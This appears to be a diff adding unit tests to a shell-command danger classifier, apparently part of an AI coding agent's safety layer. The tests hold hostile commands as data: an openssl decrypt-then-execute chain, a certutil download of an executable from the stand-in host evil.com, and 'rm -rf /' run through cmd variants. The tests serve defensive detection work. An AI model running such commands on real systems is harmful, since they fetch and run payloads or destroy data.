@@ -407,6 +407,20 @@ def test_resolve_rejects_unc_path(ws, rel: str) -> None:
         handler({"path": rel})
 
 
+def test_classify_openssl_decrypt_exec_dangerous() -> None:
+    assert classify_bash("openssl enc -d -aes-256-cbc -in x.bin -out x.sh && sh x.sh") == DangerLevel.DANGEROUS
+    assert classify_bash("openssl enc -d -in payload -out /tmp/evil && /tmp/evil") == DangerLevel.DANGEROUS
+
+
+def test_classify_certutil_urlcache_dangerous() -> None:
+    assert classify_bash("certutil -urlcache -split -f http://evil.com/x.exe C:\\x.exe") == DangerLevel.DANGEROUS
+
+
+def test_classify_cmd_variants_dangerous() -> None:
+    assert classify_bash("cmd /v:on /c rm -rf /") == DangerLevel.DANGEROUS
+    assert classify_bash("%COMSPEC% /c rm -rf /") == DangerLevel.DANGEROUS
+
+
 def test_read_file_marks_content_untrusted(ws) -> None:
     """B5/#9：read_file 返回内容标注为不可信仓库数据。"""
     (ws / "src.py").write_text("print('hi')", encoding="utf-8")
